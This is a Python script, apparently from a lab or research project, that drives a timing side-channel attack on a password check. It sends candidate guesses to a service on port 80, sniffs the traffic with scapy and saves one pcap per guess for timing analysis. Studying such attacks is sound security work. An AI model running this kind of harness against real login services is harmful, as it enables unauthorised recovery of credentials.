import threading

import requests
from TimmingAttack.pcapParser import parser
from scapy.all import *
from TimmingAttack.sniffer import *

from TimmingAttack import dataGenerator
from TimmingAttack import pcapParser


def passGenerator():
    return [''.join(i) for i in itertools.product(alphabet, repeat=1)]


alphabet = ['bYrShLk3O3i2Q5gX89sbt23stqDaUz', 'bYrShLk3O3i2Q5g','a']  # string.ascii_lowercase  # + string.digits + string.ascii_uppercase


if __name__ == "__main__":
    generated_passwords = passGenerator()

    for guess in generated_passwords:
        sniffer = Sniffer('eth0', 'tcp port 80',120)
        sniffer.start()
        sleep(1)
        generator = threading.Thread(target=dataGenerator.generateData, args=(guess,))

        generator.start()
        generator.join()


        #sniffer.flush()
        sniffer.stop()

        pkt = sniffer.pcap()
        sniffer.reset()

        wrpcap('pcaps/' + guess + '.pcap', pkt)
    parser()
